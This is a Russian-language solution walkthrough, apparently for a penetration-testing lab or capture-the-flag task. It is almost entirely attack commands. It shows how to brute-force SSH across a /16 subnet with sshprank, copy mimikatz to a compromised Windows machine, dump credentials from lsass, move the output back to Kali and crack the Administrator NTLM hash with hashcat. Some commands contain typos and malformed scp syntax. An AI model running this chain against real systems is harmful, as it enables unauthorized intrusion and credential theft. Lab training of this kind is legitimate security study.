<b>Ход решения</b> <br>
1.1. Для определения список хостов в ssh-пранк запишем их с помощью регулярных выражений в файл: <br>
echo -e 192.168.{0..255}.{0..255}"\n" | sed 's/ //' > hosts.txt<br>
1.2. Запуск sshprank:<br>
./sshprank.py -b hosts.txt -u users.txt –p passwords.txt-v , 
где hosts.txt – список записанных хостов на предыдущем шаге, 
users.txt – список пользователей, которых дали по условию
passwords.txt – список паролей, которые дали по условию
v -- вывод подробной информации<br>
1.3 Логин и пароль должны подобраться, результат в owned.txt
cat owned.txt<br>
2. С помощью утилиты scp доставляем mimikatz на PC1.<br>
2.1. Скачиваем mimikatz на kali<br>
sudo apt install mimikatz (может уже был установлен).<br>
2.2. Через утилиту scp доставляем mimikatz<br>
scp –r  <папка с mimikatz > <имя подобранной учётки>@<Пароль подобранной учётки>:”<любое место на Windows 10>”<br>
3. Находим NTLM администратора (через ssh работает на PC1):<br>
3.1. Подключаемся по ssh на PC1:<br>
ssh <имя подобранной учётки>@<Пароль подобранной учётки><br>
3.2. Извлекаем пароль из процесса lsass.exe :<br>
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tools\mimikatz\output.txt<br>
3.3. Закрываем ssh-подключение<br>
. CTR+C – <br>
3.4. Доставляем c:\tools\mimikatz\output.txt на kali для последующего брудфорса.<br>
Scp  <имя подобранной учётки>@<Пароль подобранной учётки>”c:\tools\mimikatz\output.txt” <место работы пользователя на kali>.<br>
4. Подбор пароля (уже на kali).<br>
4.1 Находим в выводе output.tx NTLM-хэш Administrator и запишим его в файл JustTheHashes.txt<br>
4.2 Расшифровка хэша с помощью hashcat: hashcat -m 1000 JustTheHashes.txt rockyou.txt --force – куда запишется найденный пароль и другое.<br>
Найденный пароль и есть ответ.